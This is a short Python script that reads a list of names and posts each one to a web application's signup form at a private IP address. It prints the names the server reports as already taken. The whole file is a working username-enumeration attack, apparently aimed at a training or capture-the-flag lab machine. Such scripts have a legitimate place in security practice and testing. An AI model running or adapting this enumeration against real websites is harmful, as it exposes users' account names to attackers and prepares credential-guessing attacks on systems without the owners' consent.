
import requests


url = "http://10.10.94.73/customers/signup"


fd = open('names.txt','r')
words = fd.read()
fd.close()


usernames = list(words.split('\n'))


for i in usernames:

	#username=admin&email=admin%40gmail.com&password=password&cpassword=password
	data = {
		"username":i,
		"email":"admin@gmail.com",
		"password":"password",
		"cpassword":"password"
	}


	headers = {
		"Content-Type": "application/x-www-form-urlencoded"
	}


	r = requests.post(url,data=data,headers=headers)
	#print(r.text)
	if "username already exists" in r.text:
		print(i)
